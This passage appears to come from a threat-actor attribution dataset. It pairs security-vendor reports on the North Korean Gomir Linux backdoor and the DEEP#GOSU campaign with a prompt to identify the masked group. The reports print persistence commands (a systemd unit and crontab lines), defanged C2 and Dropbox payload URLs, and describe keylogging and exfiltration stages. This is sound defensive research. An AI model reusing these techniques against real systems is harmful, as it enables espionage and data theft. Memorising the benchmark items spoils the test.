campaign. You can try Secure Email for free here.  Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.  Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.  Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.  Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.  Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.  Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.  Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
https://symantec-enterprise-blogs.security.com/threat-intelligence/springtail-kimsuky-backdoor-espionage	Symantec’s Threat Hunter Team has uncovered a new Linux backdoor developed by the North Korean [PLACEHOLDER] that is linked to malware used in a recent campaign against organizations in South Korea.   The backdoor (Linux.Gomir) appears to be a Linux version of the GoBear backdoor, which was used in a recent [PLACEHOLDER] campaign that saw the attackers deliver malware via Trojanized software installation packages. Gomir is structurally almost identical to GoBear, with extensive sharing of code between malware variants.  Background [PLACEHOLDER] is a tight-knit espionage group that initially specialized in attacks on public sector organizations in South Korea. The group first came to public attention in 2014, when the South Korean government said it was responsible for an attack on Korea Hydro and Nuclear Power (KHNP). Multiple employees at KHNP were targeted with spear-phishing emails containing exploits that installed disk-wiping malware on their machines. The U.S. government has said that the group is a unit of North Korea’s military intelligence organization, the Reconnaissance General Bureau (RGB).   The group was the subject of a U.S. government alert in recent days due to attempts to exploit improperly configured DNS Domain-based Message Authentication, Reporting and Conformance (DMARC) record policies to conceal social engineering attempts. According to a joint advisory issued by the Federal Bureau of Investigation (FBI), the U.S. Department of State, and the National Security Agency (NSA), the group has been mounting spear phishing campaigns pretending to be journalists, academics, and experts in East Asian affairs “with credible links to North Korean policy circles”.  Trojanized software packages The campaign, which was first documented by South Korean security firm S2W in February 2024, saw [PLACEHOLDER] deliver a new malware family named Troll Stealer using Trojanized software installation packages. Troll Stealer can steal a range of information from infected computers including files, screenshots, browser data, and system information. Written in Go, like many newer [PLACEHOLDER] malware families, Troll Stealer contained a large amount of code overlap with earlier [PLACEHOLDER] malware.  Troll Stealer’s functionality included the ability to copy the GPKI (Government Public Key Infrastructure) folder on infected computers. GPKI is the public key infrastructure schema for South Korean government personnel and state organizations, suggesting that government agencies were among the targets of the campaign.  S2W reported that the malware was distributed inside installation packages for TrustPKI and NX_PRNMAN, software developed by SGA Solutions. The installation packages were reportedly downloaded from a page that was redirected from a specific website.   South Korean security firm AhnLab subsequently provided further details on the downloads, saying they originated from the website of an association in the construction sector. The website required users to log in and the affected packages were among those users had to install to do so.   Symantec has since discovered that Troll Stealer was also delivered in Trojanized Installation packages for Wizvera VeraPort. It is unclear how these installation packages were delivered during the current campaign. Wizvera VeraPort was previously reported to have been compromised in a North Korea-linked software supply chain attack in 2020.  Troll Stealer and GoBear Troll Stealer appears to be related to another recently discovered Go-based backdoor named GoBear. Both threats are signed with a legitimate certificate issued to “D2innovation Co.,LTD”. GoBear also contains similar function names to an older [PLACEHOLDER] backdoor known as BetaSeed, which was written in C++, suggesting that both threats have a common origin.   AhnLab later explicitly linked the two threats, saying that many of the malicious installers it had analyzed contained both Troll Stealer and either of the GoBear or BetaSeed backdoors, which it referred to as the Endoor malware family.  Several weeks later, GoBear was being distributed by a dropper masquerading as an installer for an app for a Korean transport organization. In this case, the attackers did not Trojanize a legitimate software package but instead disguised the dropper as an installer featuring the organization’s logos. The dropper was signed with what appeared to be a stolen certificate.  Gomir backdoor Symantec’s investigation into the attacks uncovered a Linux version of this malware family (Linux.Gomir) which is structurally almost identical and shares an extensive amount of distinct code with the Windows Go-based backdoor GoBear. Any functionality from GoBear that is operating system-dependent is either missing or reimplemented in Gomir.   When executed, it checks its command line and if contains the string “install” as its only argument, it will attempt to install itself with persistence.   To determine how it installs itself, Gomir checks the effective group ID (as reported by the getegid32() syscall) of its own process. If the process is running as group 0, Gomir assumes that it is running with superuser privileges and attempts to copy itself as the following file:  /var/log/syslogd  It then attempts to create a systemd service with the name "syslogd" by creating the file:  /etc/systemd/system/syslogd.service  The file contains:  [Unit]  After=network.target  Description=syslogd     [Service]  ExecStart=/bin/sh -c "/var/log/syslogd"  Restart=always     [Install]  WantedBy=multi-user.target  Gomir will then enable and start the created service by executing the following sequence of commands:  ${SHELL} -c systemctl daemon-reload  ${SHELL} -c systemctl reenable syslogd  ${SHELL} -c systemctl start syslogd  It will then delete the original executable and terminate the original process.  If the process is running as any group other than 0, Gomir attempts to configure a crontab to start the backdoor on every reboot. It first creates a helper file (cron.txt) in the current working directory with the following content:  @reboot [PATHNAME_OF_THE_EXECUTING_PROCESS]  Next, it seems to attempt to list any pre-existing crontab entries by running the following command:  /bin/sh -c crontab -l  It appends the output to the created helper file.   Gomir then updates the crontab configuration by executing the following command:  ${SHELL} -c crontab cron.txt  Gomir then deletes the helper file before executing itself without any command-line parameters.  Once installed and running, Gomir periodically communicates with its command-and-control (C&C) server by sending HTTP POST requests to: http://216.189.159[.]34/mir/index.php  When pooling for commands to execute, Gomir requests with the following HTTP request body:  a[9_RANDOM_ALPHANUMERIC_CHARACTERS]=2&b[9_RANDOM_ALPHANUMERIC_CHARACTERS]=[INFECTION_ID]1&c[9_RANDOM_ALPHANUMERIC_CHARACTERS]=  The INFECTION_ID is generated using the following method:  def generate_infection_id(hostname, username):     hexdigest = hashlib.md5(hostname + username).hexdigest()      return "g-" + hexdigest[:10]  The expected body of the HTTP server response is a string starting with the letter S. Gomir then attempts to decode the remaining characters of the string using the Base64 algorithm. The decoded blob has the following structure:  Table 1. Gomir decoded blob structure Offset  Size    Description 0       4 Bytes Encryption key 4       Remainder of the blob   Encrypted command Gomir then uses a custom encryption algorithm to decrypt the previously discussed command.  The first two characters of the command identify the operation to execute. Gomir allows the execution of 17 different commands. The commands are almost identical to those supported by the GoBear Windows backdoor:   Table 2. Gomir command operations Operation       Description 01      Pauses communication with the C&C server for an arbitrary time duration. 02      Executes an arbitrary string as a shell command ("[shell]" "-c" "[arbitrary_string]"). The shell used is specified by the environment variable "SHELL", if present. Otherwise, a fallback shell is configured by operation 10 below. 03      Reports the current working directory. 04      Changes the current working directory and reports the working directory’s new pathname. 05      Probes arbitrary network endpoints for TCP connectivity. 06      Terminates its own process. This stops the backdoor. 07      Reports the executable pathname of its own process (the backdoor executable). 08      Collects statistics about an arbitrary directory tree and reports: total number of subdirectories, total number of files, total size of files 09      Reports the configuration details of the affected computer: hostname, username, CPU, RAM, network interfaces, listing each interface name, MAC, IP, and IPv6 address 10      Configures a fallback shell to use when executing the shell command in operation 02. Initial configuration value is "/bin/sh". 11      Configures a codepage to use when interpreting output from the shell command in operation 02. 12      Pauses communication with the C&C server until an arbitrary datetime. 13      Responds with the message "Not implemented on Linux!" (hardcoded). 14      Starts a reverse proxy by connecting to an arbitrary control endpoint. The communication with the control endpoint is encrypted using the SSL protocol and uses messages consistent with https://github.com/kost/revsocks.git, where the backdoor acts as a proxy client. This allows the remote attacker to initiate connections to arbitrary endpoints on the victim network. 15      Reports the control endpoints of the reverse proxy. 30      Creates an arbitrary file on the affected computer. 31      Exfiltrates an arbitrary file from the affected computer. Heavy focus on supply chain attacks This latest [PLACEHOLDER] campaign provides further evidence that software installation packages and updates are now among the most favored infection vectors for North Korean espionage actors. Variations of this tactic include:  Software supply chain attacks Trojanized software installers Fake software installers The most notable example to date is the 3CX supply chain attack, which itself was the result of the earlier X_Trader supply chain attack. [PLACEHOLDER], meanwhile, has focused on Trojanized software installers hosted on third-party sites requiring their installation or masquerading as official apps. The software targeted appears to have been carefully chosen to maximize the chances of infecting its intended South Korean-based targets.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Symantec’s Threat Hunter Team has uncovered a new Linux backdoor developed by the North Korean [PLACEHOLDER] that is linked to malware used in a recent campaign against organizations in South Korea.   The backdoor (Linux.Gomir) appears to be a Linux version of the GoBear backdoor, which was used in a recent [PLACEHOLDER] campaign that saw the attackers deliver malware via Trojanized software installation packages. Gomir is structurally almost identical to GoBear, with extensive sharing of code between malware variants.  Background [PLACEHOLDER] is a tight-knit espionage group that initially specialized in attacks on public sector organizations in South Korea. The group first came to public attention in 2014, when the South Korean government said it was responsible for an attack on Korea Hydro and Nuclear Power (KHNP). Multiple employees at KHNP were targeted with spear-phishing emails containing exploits that installed disk-wiping malware on their machines. The U.S. government has said that the group is a unit of North Korea’s military intelligence organization, the Reconnaissance General Bureau (RGB).   The group was the subject of a U.S. government alert in recent days due to attempts to exploit improperly configured DNS Domain-based Message Authentication, Reporting and Conformance (DMARC) record policies to conceal social engineering attempts. According to a joint advisory issued by the Federal Bureau of Investigation (FBI), the U.S. Department of State, and the National Security Agency (NSA), the group has been mounting spear phishing campaigns pretending to be journalists, academics, and experts in East Asian affairs “with credible links to North Korean policy circles”.  Trojanized software packages The campaign, which was first documented by South Korean security firm S2W in February 2024, saw [PLACEHOLDER] deliver a new malware family named Troll Stealer using Trojanized software installation packages. Troll Stealer can steal a range of information from infected computers including files, screenshots, browser data, and system information. Written in Go, like many newer [PLACEHOLDER] malware families, Troll Stealer contained a large amount of code overlap with earlier [PLACEHOLDER] malware.  Troll Stealer’s functionality included the ability to copy the GPKI (Government Public Key Infrastructure) folder on infected computers. GPKI is the public key infrastructure schema for South Korean government personnel and state organizations, suggesting that government agencies were among the targets of the campaign.  S2W reported that the malware was distributed inside installation packages for TrustPKI and NX_PRNMAN, software developed by SGA Solutions. The installation packages were reportedly downloaded from a page that was redirected from a specific website.   South Korean security firm AhnLab subsequently provided further details on the downloads, saying they originated from the website of an association in the construction sector. The website required users to log in and the affected packages were among those users had to install to do so.   Symantec has since discovered that Troll Stealer was also delivered in Trojanized Installation packages for Wizvera VeraPort. It is unclear how these installation packages were delivered during the current campaign. Wizvera VeraPort was previously reported to have been compromised in a North Korea-linked software supply chain attack in 2020.  Troll Stealer and GoBear Troll Stealer appears to be related to another recently discovered Go-based backdoor named GoBear. Both threats are signed with a legitimate certificate issued to “D2innovation Co.,LTD”. GoBear also contains similar function names to an older [PLACEHOLDER] backdoor known as BetaSeed, which was written in C++, suggesting that both threats have a common origin.   AhnLab later explicitly linked the two threats, saying that many of the malicious installers it had analyzed contained both Troll Stealer and either of the GoBear or BetaSeed backdoors, which it referred to as the Endoor malware family.  Several weeks later, GoBear was being distributed by a dropper masquerading as an installer for an app for a Korean transport organization. In this case, the attackers did not Trojanize a legitimate software package but instead disguised the dropper as an installer featuring the organization’s logos. The dropper was signed with what appeared to be a stolen certificate.  Gomir backdoor Symantec’s investigation into the attacks uncovered a Linux version of this malware family (Linux.Gomir) which is structurally almost identical and shares an extensive amount of distinct code with the Windows Go-based backdoor GoBear. Any functionality from GoBear that is operating system-dependent is either missing or reimplemented in Gomir.   When executed, it checks its command line and if contains the string “install” as its only argument, it will attempt to install itself with persistence.   To determine how it installs itself, Gomir checks the effective group ID (as reported by the getegid32() syscall) of its own process. If the process is running as group 0, Gomir assumes that it is running with superuser privileges and attempts to copy itself as the following file:  /var/log/syslogd  It then attempts to create a systemd service with the name "syslogd" by creating the file:  /etc/systemd/system/syslogd.service  The file contains:  [Unit]  After=network.target  Description=syslogd     [Service]  ExecStart=/bin/sh -c "/var/log/syslogd"  Restart=always     [Install]  WantedBy=multi-user.target  Gomir will then enable and start the created service by executing the following sequence of commands:  ${SHELL} -c systemctl daemon-reload  ${SHELL} -c systemctl reenable syslogd  ${SHELL} -c systemctl start syslogd  It will then delete the original executable and terminate the original process.  If the process is running as any group other than 0, Gomir attempts to configure a crontab to start the backdoor on every reboot. It first creates a helper file (cron.txt) in the current working directory with the following content:  @reboot [PATHNAME_OF_THE_EXECUTING_PROCESS]  Next, it seems to attempt to list any pre-existing crontab entries by running the following command:  /bin/sh -c crontab -l  It appends the output to the created helper file.   Gomir then updates the crontab configuration by executing the following command:  ${SHELL} -c crontab cron.txt  Gomir then deletes the helper file before executing itself without any command-line parameters.  Once installed and running, Gomir periodically communicates with its command-and-control (C&C) server by sending HTTP POST requests to: http://216.189.159[.]34/mir/index.php  When pooling for commands to execute, Gomir requests with the following HTTP request body:  a[9_RANDOM_ALPHANUMERIC_CHARACTERS]=2&b[9_RANDOM_ALPHANUMERIC_CHARACTERS]=[INFECTION_ID]1&c[9_RANDOM_ALPHANUMERIC_CHARACTERS]=  The INFECTION_ID is generated using the following method:  def generate_infection_id(hostname, username):     hexdigest = hashlib.md5(hostname + username).hexdigest()      return "g-" + hexdigest[:10]  The expected body of the HTTP server response is a string starting with the letter S. Gomir then attempts to decode the remaining characters of the string using the Base64 algorithm. The decoded blob has the following structure:  Table 1. Gomir decoded blob structure Offset  Size    Description 0       4 Bytes Encryption key 4       Remainder of the blob   Encrypted command Gomir then uses a custom encryption algorithm to decrypt the previously discussed command.  The first two characters of the command identify the operation to execute. Gomir allows the execution of 17 different commands. The commands are almost identical to those supported by the GoBear Windows backdoor:   Table 2. Gomir command operations Operation       Description 01      Pauses communication with the C&C server for an arbitrary time duration. 02      Executes an arbitrary string as a shell command ("[shell]" "-c" "[arbitrary_string]"). The shell used is specified by the environment variable "SHELL", if present. Otherwise, a fallback shell is configured by operation 10 below. 03      Reports the current working directory. 04      Changes the current working directory and reports the working directory’s new pathname. 05      Probes arbitrary network endpoints for TCP connectivity. 06      Terminates its own process. This stops the backdoor. 07      Reports the executable pathname of its own process (the backdoor executable). 08      Collects statistics about an arbitrary directory tree and reports: total number of subdirectories, total number of files, total size of files 09      Reports the configuration details of the affected computer: hostname, username, CPU, RAM, network interfaces, listing each interface name, MAC, IP, and IPv6 address 10      Configures a fallback shell to use when executing the shell command in operation 02. Initial configuration value is "/bin/sh". 11      Configures a codepage to use when interpreting output from the shell command in operation 02. 12      Pauses communication with the C&C server until an arbitrary datetime. 13      Responds with the message "Not implemented on Linux!" (hardcoded). 14      Starts a reverse proxy by connecting to an arbitrary control endpoint. The communication with the control endpoint is encrypted using the SSL protocol and uses messages consistent with https://github.com/kost/revsocks.git, where the backdoor acts as a proxy client. This allows the remote attacker to initiate connections to arbitrary endpoints on the victim network. 15      Reports the control endpoints of the reverse proxy. 30      Creates an arbitrary file on the affected computer. 31      Exfiltrates an arbitrary file from the affected computer. Heavy focus on supply chain attacks This latest [PLACEHOLDER] campaign provides further evidence that software installation packages and updates are now among the most favored infection vectors for North Korean espionage actors. Variations of this tactic include:  Software supply chain attacks Trojanized software installers Fake software installers The most notable example to date is the 3CX supply chain attack, which itself was the result of the earlier X_Trader supply chain attack. [PLACEHOLDER], meanwhile, has focused on Trojanized software installers hosted on third-party sites requiring their installation or masquerading as official apps. The software targeted appears to have been carefully chosen to maximize the chances of infecting its intended South Korean-based targets.
https://www.securonix.com/blog/securonix-threat-research-security-advisory-new-deepgosu-attack-campaign/	The Securonix Threat Research (STR) team has been monitoring a new campaign tracked as DEEP#GOSU likely associated with the [PLACEHOLDER] group, which features some new code/stagers as well as some recycled code and TTPs that were reported in the past. While the targeting of South Korean victims by the [PLACEHOLDER] group happened before, from the tradecraft observed it’s apparent that the group has shifted to using a new script-based attack chain that leverages multiple PowerShell and VBScript stagers to quietly infect systems. The later-stage scripts allow the attackers to monitor clipboard, keystroke, and other session activity.    The threat actors also employed a remote access trojan (RAT) software to allow for full control over the infected hosts, while the background scripts continued to provide persistence and monitoring capabilities.    All of the C2 communication is handled through legitimate services such as Dropbox or Google Docs allowing the malware to blend undetected into regular network traffic. Since these payloads were pulled from remote sources like Dropbox, it allowed the malware maintainers to dynamically update its functionalities or deploy additional modules without direct interaction with the system .    The malware used in the DEEP#GOSU campaign likely enters the system through typical means where the user downloads a malicious email attachment containing a zip file with a single disguised file using the extension: pdf.lnk, (IMG_20240214_0001.pdf.lnk) in this case.    Stage 1: Initial execution: LNK files [T1204.002]  The use of shortcut files, or .lnk files by threat actors is nothing new. However, in the case of DEEP#GOSU, the methodology behind the code execution is quite different from what we have typically seen in the past.    First, as seen in the figure below, the length of the command is quite impressive and it’s clear that the executed PowerShell is designed to perform several complex functions. Additionally, standing at about 2.2MB, it’s clear that there is more to this shortcut file than what meets the eye.        Figure 1: IMG_20240214_0001.pdf.lnk – command line execution    The embedded PowerShell script contained within the shortcut file is designed to take byte data from itself, which extracts embedded files, AESDecrypt and executes further malicious code downloaded from the internet (/step2/ps.bin) and clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates some level of sophistication intended to evade detection and analysis. This type of infrastructure typically takes much more time to set up and maintain versus simply hosting files on rented servers.    Let’s first analyze the reason that the shortcut file is over 2MB in size. Upon close analysis, the shortcut file appears to have an entire embedded PDF concatenated to it after tens of thousands of “A” characters. Those characters may be an attempt to pad the size of the file to evade AV detections.    The figure below demonstrates how this looks when using a hexadecimal editor to view the file’s raw data. On the left, we can see the end of the shortcut code which calls cmd.exe (to eventually call powershell.exe) and the start of the sequence of “A” characters. Over on the left the A’s terminate and the start of a PDF header appears!        Figure 2: Hex bytes of IMG_20240214_0001.pdf.lnk highlighting the embedded PDF file    So, the shortcut file has a concatenated PDF file attached to it. The PowerShell code contains a clever function that performs a few tasks. The PowerShell code below is taken from the code from within the shortcut file (figure 1) and then cleaned up a bit so it’s easier to read:        Figure 3: IMG_20240214_0001.pdf.lnk – extract PDF portion from itself    This portion of the script extracts the PDF portion of the .lnk file’s content based on specific byte positions which exists between byte values 2105824 and 2282653 ($len1 to $len2).  The script writes out the progress at each operational task such as “readfileend”, “exestart” and “exeend”.  The alias “sc” is used to instantiate a new object to hold the PDF file.  This extracted content is then eventually saved to a new variable $path, and then executed using the PowerShell Start-Process commandlet.  The PDF content is then executed which will then open in the system’s default PDF viewer which opens as “IMG_20240214_0001.pdf”.  All files are then deleted.  What makes this tactic clever is that there is technically no PDF file contained within the initial zip file sent to the victim. When the user clicks the PDF lure (shortcut file) they’re immediately presented with a PDF file thus removing any concern that anything unexpected happened.    The PDF lure document is in Korean and appears to be an announcement regarding the son of Korean Airlines CEO Choi Hyun (the late Choi Yul) and states that the son has passed away due to a car accident. The rest contains details and dates of the funeral hall.        Figure 4: IMG_20240214_0001.pdf lure document    In addition to extracting and executing the PDF document, the shortcut file also executes the malware’s next stage payload from a Dropbox URL (hxxps://content.dropboxapi[.]com/2/files/download/step2/ps.bin). Despite its name, the ps.bin file is actually another PowerShell script which we’ll dive into later.    Since Dropbox requires authentication, all of the required parameters are embedded into the shortcut’s original PowerShell script (figure 1). With the PowerShell code cleaned up, the portion of the script responsible for downloading and executing the next-stage payload ($newString) is highlighted below.        Figure 5: IMG_20240214_0001.lnk – download and invoke next-stage payload from Dropbox    To sum up, the PowerShell script contained with the shortcut file is designed to silently find and execute the specifically crafted malicious .lnk file (itself), extract and execute the embedded PDF lure document, authenticate, decrypt and execute further malicious code downloaded from Dropbox, and then clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates a level of sophistication intended to evade detection and analysis.    Stage 2: Invoked code from Dropbox [T1102]  At this stage, the initial shortcut file has downloaded and invoked a remote payload from Dropbox called ps3.bin. The PowerShell code contained within the .bin file defines a function (Load) that performs several operations which includes downloading, decompressing, and dynamically loading and executing .NET assembly code from a different Dropbox URL.    Define a decompression helper function (GzExtract):  This inner function takes a byte array as input in the form of GZIP compressed data.  Decompresses this data and return the resulting byte array  Dynamically loading .NET assemblies:  The script dynamically loads assemblies related to System.Drawing, System.Windows.Forms, and PresentationCore  This enables the script to use advanced graphical UI capabilities which have been used in the past for features such as screenshots or screen recording by Dark Pink malware among others.  Authenticating with Dropbox and downloading next-stage remote payload:  Similar to the shortcut file’s PowerShell script, it authenticates with Dropbox once again using a refresh token, client ID, and client secret to obtain an access token.  A file named r_enc.bin is downloaded from Dropbox (stage 3).  After downloading the file, it attempts to decompress the payload using the GzExtract function defined earlier.  The script implies this payload is a .NET assembly in binary form, though compressed to evade detection.  Dynamically loading and executing the .NET assembly:  It loads the decompressed .NET assembly into memory without writing it to disk which can help cut down AV detections.  It iterates through types and methods within the loaded assembly to find and invoke a specific method (makeProbe1). The invocation is commented out, but it suggests that the method would execute with a hardcoded parameter, which is partially shown and then truncated.  This dynamic loading and execution allow the malware to perform virtually any action the .NET framework supports, based on the code within the downloaded assembly.      Figure 6: Example of PowerShell ps.bin    In addition to the above the script also invokes a method on an object instance using reflection in PowerShell, with a parameter that appears to be a Base64-encoded string. The string can be seen in the figure below.        Figure 7: ps.bin PowerShell invokes next stage payloads    The $method variable is set up and holds a reference to a “MethodInfo” object, which represents a specific method of a class. The “$instance” variable contains the instance of the class which in turn contains the method you want to invoke. The string is encoded in Base64 and then passed as an argument to the method.    Since at this point the code is doing two pretty interesting things simultaneously, let’s follow the loading and execution of “r_enc.bin” from Dropbox further down (Stage 4) which is loaded from the following Dropbox URL:    hxxps://content.dropboxapi[.]com/2/files/download/step2/r_enc.bin    We’ll continue with the invocation of the new Base64 encoded method (Stage 4) further down.    Stage 3: TutClient [C# RAT] (r_enc.bin)  When analyzing the PowerShell script in Stage 2 we determined that the script once again reached back out to Dropbox and downloaded a compressed Base64 string. The file itself is indeed a binary file which can be easily confirmed using a tool such as CyberChef. If we place the large Base64 string (r_enc.bin) inside the input field, select “From Base64” and “Gunzip”, we see the MZ header and other common strings for Windows executables inside the output.        Figure 8: Decoding r_enc.bin in CyberChef    The decompressed binary file ends up being an open source RAT (remote access trojan), known as TruRat, TutRat or C# R.A.T. which generates a commonly named client called TutClient.exe.    As the name suggests, the RAT is coded in C# and is open source. Since the source of the application can be found online, we won’t go too deep into the binary code analysis portion as it’s available online, but rather discuss its capabilities.        Figure 9: C# RAT executable client overview    Currently this particular RAT software is quite old and likely to be picked up by most antivirus vendors. However, given the unique method in which this binary is loaded and executed directly into memory (stage2), it’s likely to skirt some detections.    Execution of the payload in memory, also known as “fileless” execution, is a technique used by attackers to evade detection by traditional file-based antivirus solutions. Since the payload does not touch the disk, it leaves fewer traces, making it harder for security tools to detect and mitigate the threat.    According to the C# Rat’s GitHub page, the malware supports a wide range of features including:    Keylogger  Remote desktop  Mic and cam spy  Remote Cmd prompt  Process and file manager  Fun menu (hiding desktop icons, clock, taskbar, showing messagebox, triggering Windows sound effects)  DDoS with target validation  Password manager (supporting: Internet Explorer, Google Chrome, Firefox)  Interestingly enough, this is not the first time that we’ve seen this RAT used against Korean targets. A year ago the [PLACEHOLDER] group was identified delivering TutRAT and xRAT payloads through other methods.    Stage 4: VBScript execution (invoked code from stage 2) [T1059.005]  Circling back to Stage 2, if you recall, we observed a large Base64 encoded string getting invoked. After decoding the string we reveal a VBScript code segment which once again is designed to connect back to Dropbox by interacting with specific web APIs.        Figure 10: Stage 4 VBScript execution – download info_sc.txt from Dropbox (from stage 2)    The next stage is downloaded from Dropbox in the same manner we observed during the last several stages. Using a unique client ID, refresh token and secret, the file “info_sc.txt” is downloaded from the URL:    hxxps://content.dropboxapi[.]com/2/files/download/step2/info_sc.txt    Once the file is downloaded, it is written to a VB Stream object then switches the stream’s type to text and reads it as a UTF-8 encoded string. This is a method to convert binary data (the downloaded file content) into a readable string.    The crucial part of this script is the “Execute” statement, which executes the string read from the stream as VBScript code. This means the downloaded content is not just data but executable code, which makes the purpose for Stage 4 run arbitrary VBScript code fetched from Dropbox.        Figure 11: Stage 4 VBScript execution execute downloaded code    With the code downloaded from Dropbox, parsed and then converted, it’s placed inside “convertedString” and then executed.    Lastly, the script dynamically writes a PowerShell file on the disk and then executes it (Stage 7). This file was written to:    c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps1    Originally the script dropped the file named w568232.ps12x , however it was immediately renamed to w568232.ps1 using the following command:    cmd /c rename c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps12x w568232.ps1    Stage 5: VBScript execution (info_sc.txt) [T1059.005]  If you thought at this point we were done with Dropbox stages, you might be right, depending on the OS version the victim system is running. But for now, a closer look at this script reveals several indications of more traditional malware such as persistence indicators and WMI (Windows Management Instrumentation) activity.    The script is quite complex, though it did not feature any form of obfuscation which needed to be decoded. Let’s go over some of the more interesting routines and functions to better understand its capabilities.    WMI Execution [T1047]  At the beginning of the script there is a WMProc Subroutine which uses WMI to execute commands on the system. It takes a single parameter p_cmd which specifies the executable or script that is launched by the WMI service.    Additionally, there is a commented out line with instructions to download, save and execute a remote .hwp document file. [PLACEHOLDER] has been known to use disguised hwp files in the past, so this could be an artifact of an older attack chain. The commented out line references a remote server at regard.co[.]kr, however we did not observe any network communication to that domain throughout the course of the DEEP#GOSU campaign.        Figure 12: Stage 5 VBScript execution – WMProc and TF functions    Scheduled tasks [T1053]  The TF function works with the Reg and Reg1 subroutines which are used to schedule tasks on the system. Additionally, the TF function formats a timestamp for scheduling, and the Reg subroutine actually schedules a new task. This task is configured to execute a script or command at a later time, ensuring that the malware maintains persistence on the system.        Figure 13: Stage 5 VBScript execution – Reg and Reg1 functions    Remote payload download  At this point the script checks the version of the operating system and branches its behavior accordingly. For OS versions prior to Windows 10, it uses Internet Explorer functionality to download and execute a script fetched from a remote server at    hxxp://gbionet[.]com/inc/basl/up1/list.php?query=6    After contacting the URL above, the script captures the “innerText” of the page’s body, which is the text content of the response from the server, excluding any HTML tags.    For systems running Windows 10 or later, it uses a PowerShell script which is saved into a single VBScript variable to download and execute a payload from Dropbox using similar methods we witnessed prior.        Figure 14: Stage 5 VBScript execution – Next stage download    The inclusion of Google Docs URLs in the PowerShell script encapsulated within the psTxt variable is a method used to dynamically retrieve configuration data for the Dropbox connection. This could be useful for when payloads, or Dropbox account data needs to be changed, without having to change the script itself.    As we witnessed previously, the PowerShell script uses a hard-coded password (pa55w0rd), and then executes the decrypted content. This also helps reduce the malware’s detection footprint. Using these types of services to fetch configuration data or payloads can blend in with legitimate network traffic, reducing the likelihood of network-based detection.        Figure 15: Stage 5 VBScript/PowerShell execution – invoke next stage    The decrypted content uses a predefined password and AES decryption. Since the downloaded content is encrypted another layer of protection against detection is added.    Interestingly enough, the $uh variable is not defined anywhere in the script. This is used by the Invoke-Command alias (icm) to execute a PowerShell scriptblock. This could be a mistake by the malware authors, or used in context with other more broad malware operations where it could be used with portions of code not included in the samples identified by the team.    Lastly, the decrypted content is then executed directly in memory using a PowerShell invoke-expression, which leads us into Stage 6!    Stage 6: PowerShell execution – system enumeration [T1082]  Circling back to PowerShell, the next script that gets executed is an interesting script which attempts to enumerate the victim system as much as it can. Once again, Dropbox is used, however rather than downloading the next-stage payload, it issues a carefully-crafted POST request to submit its enumeration findings.    As you can see in the data below, it formats the data into sections with headers containing plus signs on either side of the header text.        Figure 16: Stage 6 PowerShell system enumeration example    The script enumerates the following items:    Running processes (tasklist)  Firewall status for all profiles (Netsh Advfirewall show allprofiles)  Registered antivirus products via Security Center (AntiVirusProduct class from ROOT\SecurityCenter and ROOT\SecurityCenter2 namespaces)  User profile directories:  Desktop ($user_dir\Desktop)  Documents ($user_dir\Documents)  Downloads ($user_dir\Downloads)  Application data and start menu programs:  Recent documents ($appdata\Microsoft\Windows\Recent)  Start Menu Programs ($appdata\Microsoft\Windows\Start Menu\Programs)  Program files directories:  Default Program Files ($env:ProgramFiles)  Program Files (x86) for 64-bit systems ($env:ProgramFiles(x86))  All drives and their content, including:  Drive label, type, format  Directories and files within each accessible drive  Once the information is gathered it encrypts the data using AES functions similar to that of the AES decrypt functions we discussed earlier. The script then constructs an HTTP POST request to upload encrypted data. The script attempts to refresh an OAuth token for Dropbox using a client ID, secret, and refresh token, then uses this token to authorize an upload to Dropbox.        Figure 17: Stage 6 PowerShell upload enumeration data    Stage 7: stealth and persistence in PowerShell [T1041]  If you recall, this script is created and saved to the disk from Stage 5 (\appdata\roaming\microsoft\windows\w568232.ps1). The purpose of this script appears to be designed to serve as a tool for periodic communication with a command and control (C2) server via Dropbox. Its main purposes include encrypting and exfiltrating or downloading data.    Most of the script once again contains PowerShell code for handling Dropbox connections and AES encryption/decryptors however there are a few interesting functions worth mentioning.        Figure 18: stage 7 various functions inside w568232.ps1    To ensure persistent, stealthy operation, it contains unique functions for both mutex-based singleton execution ($bMute) and variable intervals for network connectivity (GetTimeInterval). The time is set to a random interval between 10000 seconds (2.78 hours). Essentially, the script acts as a versatile backdoor that allows attackers to continuously monitor and control their infected systems.    Stage 8: Keylogging [T1056.001]  The purpose of this (and final) script is to act as a keylogging and clipboard monitoring component to monitor and log user activity on the compromised system.    It achieves this by first obtaining access to Windows native APIs using .NET assemblies, and then using the Add-Type PowerShell module to call the Core class within the session. The script uses some targeted variable substitution obfuscation throughout the defined strings.        Figure 19: stage 8 obfuscated .NET assemblies    The script uses functions such as GetAsyncKeyState to monitor the state of individual keys on the keyboard, capturing key presses and releases.        Figure 20: stage 8 PowerShell keylogging functions    The PowerShell script includes functionality to monitor and log changes in the clipboard content. It does this by using the GetClipboardSequenceNumber function to retrieve the current clipboard sequence number, which changes anytime the content of the clipboard changes.    It then compares the current clipboard sequence number in $curClip with the previously stored sequence number in $oldClip. If they differ, it indicates the clipboard content has changed. If the format is verified as “text” it then uses [Windows.Clipboard]::GetText() to retrieve the new clipboard text.    Lastly, it appends the content into the $Path (Version.xml) variable using [System.IO.File]::AppendAllText.      Additional functionality:  Window monitoring: It uses both GetForegroundWindow and GetWindowText to track the active window and its title, enabling the script to log which application the user is interacting with alongside the captured keystrokes or clipboard.  System tick count: GetTickCount is also used to manage the timing of log entries (clipboard, keystrokes, etc), ensuring that 